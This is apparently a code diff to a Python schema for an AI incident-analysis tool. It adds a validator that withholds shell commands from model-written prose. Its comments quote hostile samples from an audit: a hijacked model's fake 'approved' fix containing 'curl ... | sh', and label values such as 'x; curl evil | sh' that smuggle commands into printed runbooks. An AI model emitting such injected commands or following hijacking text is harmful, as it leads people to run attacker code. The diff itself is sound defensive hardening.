@@ -22,6 +22,8 @@ from pydantic import (
     model_validator,
 )
 
+from .gate import withhold_commands
+
 # ⛔ MODEL TEXT IS INERT TEXT (2026-09-27 audit). A hijacked model wrote a hypothesis of
 # "Memory pressure.\n\n## Fix - exact commands (approved by the gate ...)\n```\ncurl ... | sh\n```"
 # and the report rendered it as a heading and a code block that looked approved - in Slack, Teams and
@@ -46,6 +48,10 @@ def _quote(text: str) -> str:
 
 
 ModelText = Annotated[str, AfterValidator(inert)]
+# The model's prose - what a person reads as its reasoning - also goes through G4 (gate.withhold_commands,
+# 2026-10-16): a write command in it is withheld. Not ids and targets: a target holding a command must still reach
+# grounding.target_problem as written, which refuses it outright.
+ModelProse = Annotated[str, AfterValidator(inert), AfterValidator(withhold_commands)]
 Quote = Annotated[str, AfterValidator(_quote)]
 
 
@@ -56,10 +62,10 @@ class Severity(str, Enum):
     low = "low"
 
 
-# ⛔ LABELS ARE NAMES, NOT TEXT (2026-09-27 audit). Label values reach shell commands a person is
-# told to paste (runbook.py), the P14 resource inventory, the stack backend's line prefixes, and
-# which resources are read. Prometheus alert labels inherit series labels, which an application can
-# export, so they are not purely rule config: `deployment='x; curl evil | sh'` became a printed
+# ⛔ LABELS ARE NAMES, NOT TEXT (2026-09-27 audit). Label values reach catalogue plan parameters, the
+# P14 resource inventory, the stack backend's line prefixes, and which resources are read (until
+# 2026-10-16 also shell commands the report told a person to paste). Prometheus alert labels inherit
+# series labels, which an application can export, so they are not purely rule config: `deployment='x; curl evil | sh'` became a printed
 # command, and `ecs_service='svc --prof admin'` an approved one. A value that is not a plain
 # identifier (or a comma list of them, or a k=v selector) is dropped here, before anything reads
 # it, and its key recorded in `rejected_labels` so the report says so.
@@ -214,8 +220,8 @@ class RuledOut(BaseModel):
     WARDEN narrowed it down"). Its citations are checked like the hypothesis's; one that does not hold is shown as
     unchecked, never as a reason."""
 
-    cause: ModelText
-    why: ModelText = ""
+    cause: ModelProse
+    why: ModelProse = ""
     citations: list[Citation] = Field(default_factory=list, max_length=5,
                                       description="Evidence that rules it out: an id and an exact quote, as above")
 
@@ -223,9 +229,9 @@ class RuledOut(BaseModel):
 class RootCause(BaseModel):
     """The model's reading of the evidence. A hypothesis — never a verdict."""
 
-    hypothesis: ModelText
+    hypothesis: ModelProse
     confidence: float = Field(ge=0.0, le=1.0)
-    evidence: list[ModelText] = Field(default_factory=list, max_length=20)
+    evidence: list[ModelProse] = Field(default_factory=list, max_length=20)
     ruled_out: list[RuledOut] = Field(default_factory=list, max_length=20)
 
     @field_validator("ruled_out", mode="before")
@@ -378,8 +384,8 @@ class RemediationProposal(BaseModel):
 
     action: ActionKind = Field(description=ACTION_MEANINGS)
     target: ModelText = Field(description="ONE resource name, e.g. checkout or lambda:my-fn - nothing else")
-    reasoning: ModelText
-    expected_effect: ModelText
+    reasoning: ModelProse
+    expected_effect: ModelProse
     # ⚠ BOTH ADVISORY. The gate does not take these as permission: P2 reads ACTION_FACTS alone, and
     # P6 reads the wider of the table's floor and this claim. A claim can therefore agree with the
     # table or tighten the gate, never loosen it. They stay REQUIRED because the claim is still
